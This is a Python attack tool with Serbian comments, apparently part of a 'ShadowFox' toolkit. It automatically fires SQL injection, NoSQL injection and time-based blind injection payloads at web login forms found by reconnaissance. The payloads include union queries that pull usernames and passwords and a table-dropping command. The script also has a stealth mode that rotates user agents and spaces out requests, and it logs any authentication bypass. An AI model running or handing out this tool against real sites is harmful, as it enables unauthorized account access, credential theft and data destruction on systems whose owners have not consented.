
## ğŸ¯ **HONEY BITE EXPLOITATION STRATEGIJE:**

### 1. **SQL INJECTION PREKO LOGIN FORME**
# Umesto obiÄnih payloada, fokus na login specifiÄne:

### 2. **NOSQL INJECTION (MongoDB/etc)**

### 3. **TIMING ATTACKS**

## ğŸ”¥ **KREIRAN SPECIALIZED HONEY BITE ATTACKER:**

#!/usr/bin/env python3
"""
ğŸ¯ SHADOWFOX HONEY BITE LOGIN EXPLOITER
Specijalizovani modul za eksploataciju slabih login formi
Autor: Whitefox980 | Verzija: 2025.06.06
"""

import requests
import json
import time
import random
import hashlib
from urllib.parse import urljoin
import warnings
warnings.filterwarnings("ignore", category=requests.packages.urllib3.exceptions.InsecureRequestWarning)

class HoneyBiteExploiter:
    def __init__(self):
        self.session = requests.Session()
        self.meta_config = {}
        self.login_endpoints = []
        self.exploit_results = {
            "mission_info": {},
            "honey_bite_analysis": {},
            "sql_injection_attempts": [],
            "nosql_injection_attempts": [],
            "timing_attack_results": [],
            "authentication_bypass": [],
            "error_disclosures": [],
            "successful_logins": [],
            "statistics": {}
        }
        
        # Specijalizovani payloadi za login forme
        self.sql_payloads = [
            # Basic SQL Injection
            {"payload": "admin'--", "type": "SQL_COMMENT", "description": "Basic SQL comment bypass"},
            {"payload": "admin'/*", "type": "SQL_COMMENT", "description": "SQL comment with asterisk"},
            {"payload": "' OR '1'='1'--", "type": "SQL_BOOLEAN", "description": "Classic boolean injection"},
            {"payload": "' OR '1'='1'/*", "type": "SQL_BOOLEAN", "description": "Boolean with comment"},
            {"payload": "') OR ('1'='1'--", "type": "SQL_BOOLEAN", "description": "Parentheses boolean bypass"},
            {"payload": "admin' OR 1=1#", "type": "SQL_BOOLEAN", "description": "MySQL hash comment"},
            
            # Union-based
            {"payload": "' UNION SELECT 1,user(),database()--", "type": "SQL_UNION", "description": "Union information disclosure"},
            {"payload": "' UNION SELECT null,username,password FROM users--", "type": "SQL_UNION", "description": "Union user extraction"},
            {"payload": "' UNION SELECT 1,@@version,3--", "type": "SQL_UNION", "description": "Database version disclosure"},
            
            # Advanced bypasses
            {"payload": "admin'='admin'--", "type": "SQL_COMPARISON", "description": "Comparison bypass"},
            {"payload": "' OR username LIKE '%admin%'--", "type": "SQL_LIKE", "description": "Like operator bypass"},
            {"payload": "'; DROP TABLE users;--", "type": "SQL_INJECTION", "description": "Destructive SQL (TEST ONLY)"},
            
            # Encoded variants
            {"payload": "admin%27--", "type": "SQL_ENCODED", "description": "URL encoded SQL comment"},
            {"payload": "%27%20OR%20%271%27%3D%271", "type": "SQL_ENCODED", "description": "URL encoded boolean"},
        ]
        
        self.nosql_payloads = [
            {"payload": "admin'||'1==1", "type": "NOSQL_BOOLEAN", "description": "NoSQL boolean bypass"},
            {"payload": "admin'||this.password.match(/.*/)//+%00", "type": "NOSQL_REGEX", "description": "NoSQL regex bypass"},
            {"payload": "admin'&&this.password.match(/^a.*$/)//+%00", "type": "NOSQL_REGEX", "description": "NoSQL regex match"},
            {"payload": "'; return true; var x='", "type": "NOSQL_INJECTION", "description": "NoSQL code injection"},
            {"payload": "$ne", "type": "NOSQL_OPERATOR", "description": "MongoDB not equal operator"},
            {"payload": "{\"$gt\":\"\"}", "type": "NOSQL_OPERATOR", "description": "MongoDB greater than"},
        ]
        
        self.timing_payloads = [
            # SQL Server
            {"payload": "admin'; WAITFOR DELAY '00:00:05'--", "type": "TIMING_MSSQL", "description": "SQL Server timing attack", "expected_delay": 5},
            {"payload": "admin'; IF (1=1) WAITFOR DELAY '00:00:03'--", "type": "TIMING_MSSQL", "description": "Conditional timing MSSQL", "expected_delay": 3},
            
            # MySQL
            {"payload": "admin'; SELECT SLEEP(5)--", "type": "TIMING_MYSQL", "description": "MySQL sleep function", "expected_delay": 5},
            {"payload": "admin' AND SLEEP(3)--", "type": "TIMING_MYSQL", "description": "MySQL conditional sleep", "expected_delay": 3},
            
            # PostgreSQL
            {"payload": "admin'; SELECT pg_sleep(4)--", "type": "TIMING_POSTGRESQL", "description": "PostgreSQL sleep", "expected_delay": 4},
            {"payload": "admin' AND pg_sleep(2)--", "type": "TIMING_POSTGRESQL", "description": "PostgreSQL conditional sleep", "expected_delay": 2},
            
            # Oracle
            {"payload": "admin'; DBMS_LOCK.SLEEP(3)--", "type": "TIMING_ORACLE", "description": "Oracle timing attack", "expected_delay": 3},
        ]
        
    def load_meta_config(self):
        """UÄitava Meta konfiguraciju misije"""
        try:
            with open('Meta/mission_info.json', 'r') as f:
                self.meta_config = json.load(f)
                self.exploit_results["mission_info"] = self.meta_config
                print(f"ğŸ§  [META] Misija: {self.meta_config.get('mission_id', 'UNKNOWN')}")
        except FileNotFoundError:
            print("âŒ [ERROR] Meta/mission_info.json nije pronaÄ‘en!")
            exit(1)
            
    def find_login_endpoints(self):
        """Pronalazi login endpoint-e iz recon podataka"""
        try:
            # UÄitaj recon rezultate
            with open('ShadowRecon/shadow_recon.json', 'r') as f:
                recon_data = json.load(f)
                
            # PronaÄ‘i login forme
            forms = recon_data.get('forms_found', [])
            login_forms = []
            
            for form in forms:
                # PronaÄ‘i forme koje liÄe na login
                inputs = form.get('inputs', [])
                has_password = any(inp.get('type') == 'password' for inp in inputs)
                has_username = any(inp.get('name', '').lower() in ['username', 'user', 'email', 'login'] for inp in inputs)
                
                if has_password or has_username:
                    login_forms.append(form)
                    print(f"ğŸ¯ [LOGIN FOUND] {form.get('action', form.get('url'))}")
                    
            self.login_endpoints = login_forms
            
            if not login_forms:
                print("âš ï¸  [WARNING] Nema pronaÄ‘enih login formi u recon podacima")
                # RuÄno dodaj ako je poznat
                target_root = self.meta_config.get('target_root', '')
                if target_root:
                    manual_login = {
                        "url": target_root,
                        "action": urljoin(target_root, "/login"),
                        "method": "POST",
                        "inputs": [
                            {"name": "username", "type": "text"},
                            {"name": "password", "type": "password"}
                        ]
                    }
                    self.login_endpoints = [manual_login]
                    print(f"ğŸ”§ [MANUAL] Dodana pretpostavka login forme: {manual_login['action']}")
                    
        except FileNotFoundError:
            print("âš ï¸  [WARNING] ShadowRecon/shadow_recon.json nije pronaÄ‘en")
            # Fallback na manual login
            target_root = self.meta_config.get('target_root', '')
            if target_root:
                manual_login = {
                    "url": target_root,
                    "action": urljoin(target_root, "/login"),
                    "method": "POST",
                    "inputs": [
                        {"name": "username", "type": "text"},
                        {"name": "password", "type": "password"}
                    ]
                }
                self.login_endpoints = [manual_login]
                
    def setup_session(self):
        """Konfiguracija sesije"""
        headers = self.meta_config.get('default_headers', {})
        self.session.headers.update(headers)
        
        if self.meta_config.get('stealth_mode', False):
            user_agents = [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            ]
            self.session.headers['User-Agent'] = random.choice(user_agents)
            
        self.session.verify = False
        self.session.timeout = 15
        
    def intelligent_delay(self):
        """Pametno kaÅ¡njenje"""
        if self.meta_config.get('stealth_mode', False):
            delay = self.meta_config.get('rate_delay_seconds', 2.5)
            time.sleep(delay + random.uniform(0, 1))
        else:
            time.sleep(random.uniform(0.5, 1.5))
            
    def extract_login_fields(self, login_form):
        """IzvlaÄi imena polja iz login forme"""
        inputs = login_form.get('inputs', [])
        
        username_field = None
        password_field = None
        additional_fields = {}
        
        for inp in inputs:
            name = inp.get('name', '')
            inp_type = inp.get('type', 'text')
            
            if inp_type == 'password':
                password_field = name
            elif name.lower() in ['username', 'user', 'email', 'login']:
                username_field = name
            elif inp_type not in ['submit', 'button']:
                additional_fields[name] = inp.get('value', '')
                
        # Fallback imena
        if not username_field:
            username_field = 'username'
        if not password_field:
            password_field = 'password'
            
        return username_field, password_field, additional_fields
        
    def test_sql_injection(self, login_form):
        """Testira SQL injection na login formi"""
        print(f"\nğŸ§ª [SQL TEST] Testing SQL injection na: {login_form.get('action')}")
        
        username_field, password_field, additional_fields = self.extract_login_fields(login_form)
        
        for payload_data in self.sql_payloads:
            payload = payload_data['payload']
            payload_type = payload_data['type']
            description = payload_data['description']
            
            print(f"   ğŸ¯ Testing: {payload_type} - {payload}")
            
            # Test payload u username polju
            test_data = {
                username_field: payload,
                password_field: 'test123',
                **additional_fields
            }
            
            result = self.execute_login_attempt(login_form, test_data, payload_data, 'username')
            self.exploit_results["sql_injection_attempts"].append(result)
            
            self.intelligent_delay()
            
            # Test payload u password polju
            test_data = {
                username_field: 'admin',
                password_field: payload,
                **additional_fields
            }
            
            result = self.execute_login_attempt(login_form, test_data, payload_data, 'password')
            self.exploit_results["sql_injection_attempts"].append(result)
            
            self.intelligent_delay()
            
    def test_nosql_injection(self, login_form):
        """Testira NoSQL injection"""
        print(f"\nğŸ§ª [NOSQL TEST] Testing NoSQL injection na: {login_form.get('action')}")
        
        username_field, password_field, additional_fields = self.extract_login_fields(login_form)
        
        for payload_data in self.nosql_payloads:
            payload = payload_data['payload']
            
            print(f"   ğŸ¯ Testing: {payload_data['type']} - {payload}")
            
            test_data = {
                username_field: payload,
                password_field: 'test123',
                **additional_fields
            }
            
            result = self.execute_login_attempt(login_form, test_data, payload_data, 'username')
            self.exploit_results["nosql_injection_attempts"].append(result)
            
            self.intelligent_delay()
            
    def test_timing_attacks(self, login_form):
        """Testira timing napade"""
        print(f"\nâ±ï¸  [TIMING TEST] Testing timing attacks na: {login_form.get('action')}")
        
        username_field, password_field, additional_fields = self.extract_login_fields(login_form)
        
        for payload_data in self.timing_payloads:
            payload = payload_data['payload']
            expected_delay = payload_data.get('expected_delay', 5)
            
            print(f"   â³ Testing: {payload_data['type']} - oÄekivano kaÅ¡njenje: {expected_delay}s")
            
            test_data = {
                username_field: payload,
                password_field: 'test123',
                **additional_fields
            }
            
            start_time = time.time()
            result = self.execute_login_attempt(login_form, test_data, payload_data, 'username')
            actual_delay = time.time() - start_time
            
            result['timing_analysis'] = {
                'expected_delay': expected_delay,
                'actual_delay': round(actual_delay, 2),
                'timing_success': actual_delay >= (expected_delay - 1)  # 1s tolerancija
            }
            
            if result['timing_analysis']['timing_success']:
                print(f"   ğŸ¯ [TIMING SUCCESS] Delay potvrÄ‘en: {actual_delay}s!")
                result['vulnerability_confirmed'] = True
                
            self.exploit_results["timing_attack_results"].append(result)
            
            time.sleep(2)  # Dodatna pauza izmeÄ‘u timing napada
            
    def execute_login_attempt(self, login_form, test_data, payload_data, injection_field):
        """IzvrÅ¡ava jedan login pokuÅ¡aj"""
        action_url = login_form.get('action')
        method = login_form.get('method', 'POST').upper()
        
        attack_id = hashlib.md5(f"{action_url}{str(test_data)}".encode()).hexdigest()[:8]
        
        try:
            if method == 'POST':
                response = self.session.post(action_url, data=test_data)
            else:
                response = self.session.get(action_url, params=test_data)
                
            # Analiza response-a
            analysis = self.analyze_login_response(response, payload_data, test_data)
            
            result = {
                "attack_id": attack_id,
                "login_form": action_url,
                "payload_data": payload_data,
                "test_data": test_data,
                "injection_field": injection_field,
                "response_analysis": analysis,
                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
            }
            
            return result
            
        except Exception as e:
            return {
                "attack_id": attack_id,
                "login_form": action_url,
                "payload_data": payload_data,
                "error": str(e),
                "status": "FAILED"
            }
            
    def analyze_login_response(self, response, payload_data, test_data):
        """Analizira response login pokuÅ¡aja"""
        analysis = {
            "status_code": response.status_code,
            "content_length": len(response.content),
            "headers": dict(response.headers),
            "vulnerability_indicators": [],
            "authentication_bypass": False,
            "error_disclosure": False
        }
        
        response_text = response.text.lower()
        payload = payload_data.get('payload', '')
        
        # 1. Proveri authentication bypass
        success_indicators = [
            'welcome', 'dashboard', 'logout', 'profile', 'settings',
            'admin panel', 'user panel', 'successfully logged',
            'location.href', 'redirect'
        ]
        
        bypass_found = any(indicator in response_text for indicator in success_indicators)
        if bypass_found or response.status_code in [302, 301]:  # Redirection = moÅ¾da uspeh
            analysis["authentication_bypass"] = True
            analysis["vulnerability_indicators"].append({
                "type": "AUTHENTICATION_BYPASS",
                "severity": "CRITICAL",
                "description": f"MoguÄ‡i bypass sa payload: {payload}"
            })
            self.exploit_results["authentication_bypass"].append(analysis)
            print(f"ğŸš¨ [CRITICAL] Authentication bypass detektovan!")
            
        # 2. Error disclosure
        error_patterns = [
            ('sql', 'SQL_ERROR'),
            ('mysql', 'MYSQL_ERROR'),
            ('postgresql', 'POSTGRESQL_ERROR'),
            ('ora-', 'ORACLE_ERROR'),
            ('syntax error', 'SYNTAX_ERROR'),
            ('database', 'DATABASE_ERROR'),
            ('query', 'QUERY_ERROR')
        ]
        
        for pattern, error_type in error_patterns:
            if pattern in response_text:
                analysis["error_disclosure"] = True
                analysis["vulnerability_indicators"].append({
                    "type": "ERROR_DISCLOSURE",
                    "severity": "HIGH",
                    "description": f"{error_type} detektovan u response"
                })
                self.exploit_results["error_disclosures"].append(analysis)
                print(f"ğŸ’¥ [ERROR] {error_type} disclosure detektovan!")
                
        # 3. Reflection check
        if payload and payload in response.text:
            analysis["vulnerability_indicators"].append({
                "type": "PAYLOAD_REFLECTION",
                "severity": "MEDIUM",
                "description": f"Payload reflektovan: {payload}"
            })
            
        return analysis
        
    def run_honey_bite_exploitation(self):
        """PokreÄ‡e kompletnu honey bite eksploataciju"""
        print("ğŸ¯ HONEY BITE LOGIN EXPLOITER - POKRETANJE")
        print("=" * 60)
        
        if not self.login_endpoints:
            print("âŒ [ERROR] Nema pronaÄ‘enih login endpoint-a!")
            return
            
        total_attacks = 0
        
        for login_form in self.login_endpoints:
            print(f"\nğŸ¯ [TARGET] {login_form.get('action')}")
            
            # SQL Injection testovi
            self.test_sql_injection(login_form)
            total_attacks += len(self.sql_payloads) * 2  # username + password
            
            # NoSQL Injection testovi
            self.test_nosql_injection(login_form)
            total_attacks += len(self.nosql_payloads)
            
            # Timing Attack testovi
            self.test_timing_attacks(login_form)
            total_attacks += len(self.timing_payloads)
            
        # Generisanje statistike
        stats = {
            "total_login_forms": len(self.login_endpoints),
            "total_attacks": total_attacks,
            "sql_injection_attempts": len(self.exploit_results["sql_injection_attempts"]),
            "nosql_injection_attempts": len(self.exploit_results["nosql_injection_attempts"]),
            "timing_attacks": len(self.exploit_results["timing_attack_results"]),
            "authentication_bypasses": len(self.exploit_results["authentication_bypass"]),
            "error_disclosures": len(self.exploit_results["error_disclosures"]),
            "critical_findings": len(self.exploit_results["authentication_bypass"]),
            "scan_timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
        }
        
        self.exploit_results["statistics"] = stats
        
    def save_results(self):
        """Snimanje rezultata"""
        output_file = "Taktika/honey_bite_results.json"
        
        try:
            with open(output_file, 'w') as f:
                json.dump(self.exploit_results, f, indent=2, ensure_ascii=False)
            print(f"\nğŸ’¾ [SAVE] Rezultati snimljeni: {output_file}")
        except Exception as e:
            print(f"âŒ [SAVE ERROR] {str(e)}")
            
    def display_summary(self):
        """Prikaz saÅ¾etka"""
        stats = self.exploit_results["statistics"]
        print("\nğŸ¯ HONEY BITE EXPLOITATION - SAÅ½ETAK")
        print("=" * 60)
        print(f"ğŸ¯ Login forme testirane: {stats['total_login_forms']}")
        print(f"ğŸš€ Ukupno napada: {stats['total_attacks']}")
        print(f"ğŸ’‰ SQL injection pokuÅ¡aja: {stats['sql_injection_attempts']}")
        print(f"ğŸ§¬ NoSQL injection pokuÅ¡aja: {stats['nosql_injection_attempts']}")
        print(f"â±ï¸  Timing napada: {stats['timing_attacks']}")
        print(f"\nğŸš¨ KRITIÄŒNI NALAZI:")
        print(f"   ğŸ”“ Authentication bypass: {stats['authentication_bypasses']}")
        print(f"   ğŸ’¥ Error disclosure: {stats['error_disclosures']}")
        print(f"   ğŸ¯ Ukupno kritiÄnih: {stats['critical_findings']}")
        
        if stats['critical_findings'] > 0:
            print(f"\nğŸ”¥ [ALERT] {stats['critical_findings']} KRITIÄŒNIH RANJIVOSTI PRONAÄENO!")
            print("ğŸ“‹ Detalji u: Taktika/honey_bite_results.json")
        else:
            print(f"\nâœ… Nema kritiÄnih ranjivosti, ali proveri error disclosure")
            
    def run(self):
        """Glavna funkcija"""
        # 1. UÄitaj Meta config
        self.load_meta_config()
        
        # 2. PronaÄ‘i login endpoint-e
        self.find_login_endpoints()
        
        # 3. Podesi sesiju
        self.setup_session()
        
        # 4. Pokreni eksploataciju
        self.run_honey_bite_exploitation()
        
        # 5. Snimi rezultate
        self.save_results()
        
        # 6. PrikaÅ¾i saÅ¾etak
        self.display_summary()

def main():
    exploiter = HoneyBiteExploiter()
    exploiter.run()

if __name__ == "__main__":
    main()

